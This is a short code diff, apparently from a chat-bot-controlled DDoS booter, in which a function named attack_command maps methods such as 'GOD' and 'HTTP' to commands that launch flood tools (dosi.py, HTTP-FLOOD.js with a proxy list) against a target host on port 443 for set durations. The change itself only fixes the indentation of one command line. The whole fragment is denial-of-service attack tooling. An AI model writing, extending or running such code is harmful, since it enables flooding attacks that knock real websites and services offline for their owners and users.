@@ -288,7 +288,7 @@ def attack_command(message):
         elif method == 'GOD':
             command = ["python", "dosi.py","bypass", host, "443","1000","1000"]
             duration = 45
-        command = ["python", "dosi.py","browser", host, "443","1000","1000"]
+            command = ["python", "dosi.py","browser", host, "443","1000","1000"]
             duration = 90
         elif method == 'HTTP':
             command = ["node", "HTTP-FLOOD.js", host, "300", "5", "90", "proxy.txt"]
